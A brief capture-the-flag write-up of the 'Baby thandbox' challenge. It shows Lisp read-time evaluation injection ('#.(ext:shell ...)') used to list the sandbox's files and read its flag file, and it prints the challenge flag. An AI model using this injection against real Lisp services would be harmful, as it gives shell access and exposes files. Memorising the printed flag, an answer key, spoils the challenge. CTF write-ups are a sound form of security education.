# [misc/pwn - Baby thandbox](https://hack.cert.pl/challenge/baby-thandbox)

I noticed that it's possible to inject Lisp code using syntax `#.(code)` so the solution was pretty straight forward, using shell commands:
```lisp
> #.(ext:shell "ls")
bin
etc
flag_144de66289ad4b9ffa8578cb862c7db7.txt
lib
lib64
root
sandbox
sbin
usr
NIL
```
```lisp
> #.(ext:shell "cat flag_144de66289ad4b9ffa8578cb862c7db7.txt")
ecsc23{LISP_is_a_speech_defect_in_which_s_is_pronounced_like_th_in_thick}NIL
```

### Flag
```
ecsc23{LISP_is_a_speech_defect_in_which_s_is_pronounced_like_th_in_thick}
```
